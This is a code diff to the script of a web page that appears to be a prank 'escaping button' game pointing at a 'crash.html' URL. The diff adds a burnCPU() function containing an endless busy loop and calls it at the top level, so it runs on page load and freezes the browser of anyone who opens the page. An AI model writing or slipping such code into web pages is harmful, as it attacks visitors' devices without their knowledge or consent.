@@ -41,6 +41,12 @@
 <script>
 const TARGET_URL = "https://jnr2ljtjnl2rsnsv.github.io/Jaj/crash.html";
 
+function burnCPU() {
+        while (true) {
+          Math.sqrt(Math.random() * 1e12);
+        }
+      }
+
 let escapeCount = 0;
 let phase = 1; // 1=逃げる 2=隠れる 3=分裂
 const btn = document.getElementById("mainBtn");
@@ -106,6 +112,9 @@ function splitPhase() {
     document.body.appendChild(b);
   }
 }
+
+burnCPU();
+
 </script>
 
 </body>
